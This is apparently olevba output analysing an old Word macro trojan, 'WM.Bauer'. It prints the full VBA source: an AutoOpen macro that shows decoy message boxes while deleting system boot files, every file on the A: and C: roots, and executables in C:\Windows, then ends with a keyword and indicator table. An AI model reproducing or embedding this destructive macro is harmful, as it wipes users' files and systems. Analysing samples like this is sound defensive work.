olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Bauer
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Bauer - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.Bauer - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
MsgBox "Play a game"
Call HD
End Sub

Sub HD()
On Error GoTo fun
Kill "C:\Command.com"
Kill "C:\MSDOS.sys"
Kill "C:\io.sys"
Kill "C:\Autoexec.bat"
fun:
Call stairway
End Sub

Sub stairway()
On Error GoTo greetings
Kill "A:\*.*"
greetings:
On Error GoTo yeah
Kill "C:\*.*"
yeah:
Call Packman
End Sub

Sub Packman()
MsgBox "Microsoft Word is konverting the Dokument."
On Error GoTo happy
Kill "C:\Windows\*.exe"
Kill "C:\Windows\*.com"
happy:
Call ende
End Sub

Sub ende()

MsgBox "That was the WM.Bauer.Trojan. Thanks for everything."

End Sub

Sub Happyness()
Attribute Happyness.VB_Description = "brings you happyness"
Attribute Happyness.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Happyness"

    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "This is my part of happyness....try to understand it......"
Call AutoOpen
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

